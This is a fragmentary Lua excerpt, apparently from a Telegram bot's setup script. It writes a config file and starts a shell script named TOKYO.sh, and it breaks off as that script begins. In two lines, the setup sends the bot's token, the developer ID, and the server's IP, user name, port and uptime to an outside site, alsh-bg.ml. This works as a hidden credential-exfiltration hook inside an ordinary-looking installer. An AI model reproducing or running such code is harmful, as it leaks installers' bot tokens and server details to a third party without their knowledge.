...
https.request("https://alsh-bg.ml/TED.php?token=توكنك&id=ايديك&user=يوزرك"..DevAbs:get(ServerDavid.."IdDavid").."&TokenBot="..DevAbs:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
...
https.request("https://alsh-bg.ml/TED.php?token=توكنك&id=ايديك&user=يوزرك"..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
Create(Config, "./config.lua")   
file = io.open("TOKYO.sh", "w")  
file:write([[
#!/usr/bin/env bash
